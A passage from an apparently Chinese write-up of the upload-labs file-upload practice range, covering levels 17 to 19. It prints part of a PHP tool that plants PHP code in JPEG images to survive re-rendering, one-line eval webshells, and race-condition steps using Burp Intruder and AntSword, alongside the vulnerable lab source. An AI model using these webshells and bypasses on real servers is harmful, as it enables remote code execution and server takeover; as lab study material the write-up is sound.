2;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            if($marker === 0xDA) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, 0, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE);</span><br><span class="line">                if($extraBytes !== 0) &#123;</span><br><span class="line">                    while((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        if($dis-&gt;readByte() === 0xFF) &#123;</span><br><span class="line">                            if($dis-&gt;readByte !== 0x00) &#123;</span><br><span class="line">                                break;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - 2;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, 0, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            0,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; elseif($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123;</span><br><span class="line">                    die(&#x27;Success!&#x27;);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(&#x27;payload_&#x27;.$argv[1]);</span><br><span class="line">    die(&#x27;Something\&#x27;s wrong&#x27;);</span><br><span class="line"></span><br><span class="line">    function checkImage($filename, $data, $unlink = FALSE) &#123;</span><br><span class="line">        global $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = TRUE;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        if($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        return $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;</span><br><span class="line">        global $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = FALSE;</span><br><span class="line">        if(preg_match(&#x27;/(\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123;</span><br><span class="line">            if(isset($m[1])) &#123;</span><br><span class="line">                $extraBytes = (int)$m[1];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class DataInputStream &#123;</span><br><span class="line">        private $binData;</span><br><span class="line">        private $order;</span><br><span class="line">        private $size;</span><br><span class="line"></span><br><span class="line">        public function __construct($filename, $order = false, $fromString = false) &#123;</span><br><span class="line">            $this-&gt;binData = &#x27;&#x27;;</span><br><span class="line">            $this-&gt;order = $order;</span><br><span class="line">            if(!$fromString) &#123;</span><br><span class="line">                if(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;);</span><br><span class="line">                $this-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $this-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            $this-&gt;size = strlen($this-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function seek() &#123;</span><br><span class="line">            return ($this-&gt;size - strlen($this-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function skip($skip) &#123;</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readByte() &#123;</span><br><span class="line">            if($this-&gt;eof()) &#123;</span><br><span class="line">                die(&#x27;End Of File&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr($this-&gt;binData, 0, 1);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 1);</span><br><span class="line">            return ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readShort() &#123;</span><br><span class="line">            if(strlen($this-&gt;binData) &lt; 2) &#123;</span><br><span class="line">                die(&#x27;End Of File&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr($this-&gt;binData, 0, 2);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 2);</span><br><span class="line">            if($this-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);</span><br><span class="line">            &#125;</span><br><span class="line">            return $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function eof() &#123;</span><br><span class="line">            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>首先，上传一张较大的jpg图片，100k左右，再将经过二次渲染的jpg图片下载到本地，使用以上脚本植入恶意代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php jpg_payload.php 1.jpg</span><br><span class="line">//注意：修改脚本中$miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;的值，即可修改植入的恶意代码</span><br></pre></td></tr></table></figure><p>最后，将植入了恶意代码的payload_1.jpg上传到服务器即可绕过二次渲染。</p><p>另外，这个脚本处理图片不是百分百成功的，要多试几次。借用国光大哥的经验：</p><ol><li>需要被 imagecreatefromjpeg 渲染或再用工具</li><li>图片找的稍微大一点 成功率更高</li><li>Payload 语句越短成功率越高</li><li>一张图片不行就换一张 不要死磕</li><li>国光补充：貌似白色的图片成功率也比较高</li><li><code>&lt;?php $_GET[0]($_POST[1]);?&gt;</code> 这种payload 成功率很高</li></ol><h5 id="解题4"><a href="#解题4" class="headerlink" title="解题4"></a>解题4</h5><p>条件竞争解法：</p><p>制作一个几百KB的图片马test.jpg，使服务器二次渲染图片时要花费更多的时间，图片马包含的恶意代码是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]) ?&gt;&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>访问include.php?file&#x3D;.&#x2F;upload&#x2F;test.jpg，并用burpsuite抓包，爆破10000次。</p><p>在这个过程中，反复向服务器上传test.jpg，在burpsuite中按length排序，很快就能看到成功包含了未二次渲染之前的图片马的报文，现在在访问uploadlabs&#x2F;shell.php，就可以发现已生成的一句话木马（因为是include.php包含了图片，所以木马生成所在位置是和include.php一个目录下的）。</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220201164851567.png" alt="image-20220201164851567"></p><h4 id="Pass-18条件竞争"><a href="#Pass-18条件竞争" class="headerlink" title="Pass-18条件竞争"></a>Pass-18条件竞争</h4><h5 id="解题1-17"><a href="#解题1-17" class="headerlink" title="解题1"></a>解题1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题是先把上传文件按原文件名上传到服务器，然后再取它的扩展名，进行白名单过滤，如果扩展名不匹配，再用unlink()函数删除该文件。</p><p>那么，这个过程就是存在漏洞的，在文件上传到服务器，到它检测完删除的这段时间，如果被外界访问，就可以使其被服务器解析，从而执行恶意代码，如果这个恶意代码是生成另一个木马文件，那么就可以以此绕过服务器的过滤机制。</p><p>首先，上传一个1.php文件，并用burpsuite捕捉这个上传包，发送到Intruder模块，爆破10000次。1.php的内容是生成一个名为shell.php的一句话木马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]) ?&gt;&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后，访问1.php，并用burpsuite捕捉这个包，发送到Intruder模块，爆破10000次。</p><p>观察访问1.php的爆破窗口，按status排序，可以很快发现访问成功的200状态码，这说明爆破程序成功在服务器unlink()删除文件之前访问了一次1.php，而按照1.php中的代码，一个包含一句话木马的shell.php应该已经在服务器中被创建了。</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220201111313956.png" alt="image-20220201111313956"></p><p>使用蚁剑链接shell.php，发现访问成功：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220201111903486.png"></p><h4 id="Pass-19条件竞争与apache文件解析漏洞"><a href="#Pass-19条件竞争与apache文件解析漏洞" class="headerlink" title="Pass-19条件竞争与apache文件解析漏洞"></a>Pass-19条件竞争与apache文件解析漏洞</h4><h5 id="解题1-18"><a href="#解题1-18" class="headerlink" title="解题1"></a>解题1</h5><p><strong>注：这一关网页里提供的myupload.php的代码是有问题的，缺少很多，要自己去靶机www目录找源文件看。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><span class="line">//index.php</span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    require_once(&quot;./myupload.php&quot;);</span><br><span class="line">    $imgFileName =time();</span><br><span class="line">    $u = new MyUpload($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;], $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $_FILES[&#x27;upload_file&#x27;][&#x27;size&#x27;],$imgFileName);</span><br><span class="line">    $status_code = $u-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    switch ($status_code) &#123;</span><br><span class="line">        case 1:</span><br><span class="line">            $is_upload = true;</span><br><span class="line">            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;</span><br><span class="line">            break;</span><br><span class="line">        case 2:</span><br><span class="line">            $msg = &#x27;文件已经被上传，但没有重命名。&#x27;;</span><br><span class="line">            break; </span><br><span class="line">        case -1:</span><br><span class="line">            $msg = &#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;;</span><br><span class="line">            break; </span><br><span class="line">        case -2:</span><br><span class="line">            $msg = &#x27;上传失败，上传目录不可写。&#x27;;</span><br><span class="line">            break; </span><br><span class="line">        case -3:</span><br><span class="line">            $msg = &#x27;上传失败，无法上传该类型文件。&#x27;;</span><br><span class="line">            break; </span><br><span class="line">        case -4:</span><br><span class="line">            $msg = &#x27;上传失败，上传的文件过大。&#x27;;</span><br><span class="line">            break; </span><br><span class="line">        case -5:</span><br><span class="line">            $msg = &#x27;上传失败，服务器已经存在相同名称文件。&#x27;;</span><br><span class="line">            break; </span><br><span class="line">        case -6:</span><br><span class="line">            $msg = &#x27;文件无法上传，文件不能复制到目标目录。&#x27;;</span><br><span class="line">            break;      </span><br><span class="line">        default:</span><br><span class="line">            $msg = &#x27;未知错误！&#x27;;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//myupload.php</span><br><span class="line">&lt;?php</span><br><span class="line">class MyUpload&#123;</span><br><span class="line">var $cls_upload_dir = &quot;&quot;; </span><br><span class="line">var $cls_filename = &quot;&quot;;           // 文件名</span><br><span class="line">var $cls_tmp_filename = &quot;&quot;;       // 临时文件名</span><br><span class="line">var $cls_max_filesize = 33554432; // 文件大小上限</span><br><span class="line">var $cls_filesize =&quot;&quot;;            // 文件大小</span><br><span class="line">var $cls_arr_ext_accepted = array(&quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,&quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );//文件白名单</span><br><span class="line">var $cls_file_exists = 0;         </span><br><span class="line">var $cls_rename_file = 1;         </span><br><span class="line">var $cls_file_rename_to = &#x27;&#x27;;     // 新文件名</span><br><span class="line">var $cls_verbal = 0;              </span><br><span class="line"></span><br><span class="line">//类实例化，形参分别给文件名，临时文件名，文件大小，新文件名</span><br><span class="line">  function MyUpload( $file_name, $tmp_file_name, $file_size, $file_rename_to = &#x27;&#x27; )&#123;</span><br><span class="line">    $this-&gt;cls_filename = $file_name;</span><br><span class="line">    $this-&gt;cls_tmp_filename = $tmp_file_name;</span><br><span class="line">    $this-&gt;cls_filesize = $file_size;</span><br><span class="line">    $this-&gt;cls_file_rename_to = $file_rename_to;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">//检查文件是否是由POST上传的</span><br><span class="line">  function isUploadedFile()&#123;</span><br><span class="line">    if( is_uploaded_file( $this-&gt;cls_tmp_filename ) != true )&#123;</span><br><span class="line">      return &quot;IS_UPLOADED_FILE_FAILURE&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      return 1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">//检查路径是否可写的</span><br><span class="line">  function setDir( $dir )&#123;</span><br><span class="line">    </span><br><span class="line">    if( !is_writable( $dir ) )&#123;</span><br><span class="line">      return &quot;DIRECTORY_FAILURE&quot;;</span><br><span class="line">    &#125; else &#123; </span><br><span class="line">      $this-&gt;cls_upload_dir = $dir;</span><br><span class="line">      return 1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">//检查后缀是否在白名单许可内</span><br><span class="line">  function checkExtension()&#123;</span><br><span class="line">    </span><br><span class="line">    // Check if the extension is valid</span><br><span class="line"></span><br><span class="line">    if( !in_array( strtolower( strrchr( $this-&gt;cls_filename, &quot;.&quot; )), $this-&gt;cls_arr_ext_accepted ))&#123;</span><br><span class="line">      return &quot;EXTENSION_FAILURE&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      return 1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">//检查文件是否过大</span><br><span class="line">  function checkSize()&#123;</span><br><span class="line"></span><br><span class="line">    if( $this-&gt;cls_filesize &gt; $this-&gt;cls_max_filesize )&#123;</span><br><span class="line">      return &quot;FILE_SIZE_FAILURE&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      return 1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">//正式移动文件到指定目录</span><br><span class="line">  function move()&#123;</span><br><span class="line">    </span><br><span class="line">    if( move_uploaded_file( $this-&gt;cls_tmp_filename, $this-&gt;cls_upload_dir . $this-&gt;cls_filename ) == false )&#123;</span><br><span class="line">      return &quot;MOVE_UPLOADED_FILE_FAILURE&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">//检查是否有重名文件</span><br><span class="line">  function checkFileExists()&#123;</span><br><span class="line">    </span><br><span class="line">    if( file_exists( $this-&gt;cls_upload_dir . $this-&gt;cls_filename ) )&#123;</span><br><span class="line">      return &quot;FILE_EXISTS_FAILURE&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      return 1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">//对文件进行重命名，使用随机数的方法</span><br><span class="line">  function renameFile()&#123;</span><br><span class="line"></span><br><span class="line">    // if no new name was provided, we use</span><br><span class="line"></span><br><span class="line">    if( $this-&gt;cls_file_rename_to == &#x27;&#x27; )&#123;</span><br><span class="line"></span><br><span class="line">      $allchar = &quot;abcdefghijklnmopqrstuvwxyz&quot; ; </span><br><span class="line">      $this-&gt;cls_file_rename_to = &quot;&quot; ; </span><br><span class="line">      mt_srand (( double) microtime() * 1000000 ); </span><br><span class="line">      for ( $i = 0; $i&lt;8 ; $i++ )&#123;</span><br><span class="line">        $this-&gt;cls_file_rename_to .= substr( $allchar, mt_rand (0,25), 1 ) ; </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    // Remove the extension and put it back on the new file name</span><br><span class="line"></span><br><span class="line">    $extension = strrchr( $this-&gt;cls_filename, &quot;.&quot; );</span><br><span class="line">    $this-&gt;cls_file_rename_to .= $extension;</span><br><span class="line">    </span><br><span class="line">    if( !rename( $this-&gt;cls_upload_dir . $this-&gt;cls_filename, $this-&gt;cls_upload_dir . $this-&gt;cls_file_rename_to ))&#123;</span><br><span class="line">      return &quot;RENAME_FAILURE&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      return 1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">//控制整个上传过程，验证POST、设置路径、检查扩展名、检查大小、检查重名、移动、重命名</span><br><span class="line">  function upload( $dir )&#123;</span><br><span class="line">    </span><br><span class="line">    $ret = $this-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = $this-&gt;setDir( $dir );</span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = $this-&gt;checkExtension();</span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = $this-&gt;checkSize();</span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // if flag to check if the file exists is set to 1</span><br><span class="line">    </span><br><span class="line">    if( $this-&gt;cls_file_exists == 1 )&#123;</span><br><span class="line">      </span><br><span class="line">      $ret = $this-&gt;checkFileExists();</span><br><span class="line">      if( $ret != 1 )&#123;</span><br><span class="line">        return $this-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // if we are here, we are ready to move the file to destination</span><br><span class="line"></span><br><span class="line">    $ret = $this-&gt;move();</span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // check if we need to rename the file</span><br><span class="line"></span><br><span class="line">    if( $this-&gt;cls_rename_file == 1 )&#123;</span><br><span class="line">      $ret = $this-&gt;renameFile();</span><br><span class="line">      if( $ret != 1 )&#123;</span><br><span class="line">        return $this-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // if we are here, everything worked as planned :)</span><br><span class="line"></span><br><span class="line">    return $this-&gt;resultUpload( &quot;SUCCESS&quot; );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">//根据upload()中可能发生的报错，返回告警信息。</span><br><span class="line">  function resultUpload( $flag )&#123;</span><br><span class="line"></span><br><span class="line">    switch( $flag )&#123;</span><br><span class="line">      case &quot;IS_UPLOADED_FILE_FAILURE&quot; : if( $this-&gt;cls_verbal == 0 ) return -1; else return &quot;The file could not be uploaded to the tmp directory of the web server.&quot;;</span><br><span class="line">        break;</span><br><span class="line">      case &quot;DIRECTORY_FAILURE&quot;        : if( $this-&gt;cls_verbal == 0 ) return -2; else return &quot;The file could not be uploaded, the directory is not writable.&quot;;</span><br><span class="line">        break;</span><br><span class="line">      case &quot;EXTENSION_FAILURE&quot;        : if( $this-&gt;cls_verbal == 0 ) return -3; else return &quot;The file could not be uploaded, this type of file is not accepted.&quot;;</span><br><span class="line">        break;</span><br><span class="line">      case &quot;FILE_SIZE_FAILURE&quot;        : if( $this-&gt;cls_verbal == 0 ) return -4; else return &quot;The file could not be uploaded, this file is too big.&quot;;</span><br><span class="line">        break;</span><br><span class="line">      case &quot;FILE_EXISTS_FAILURE&quot;      : if( 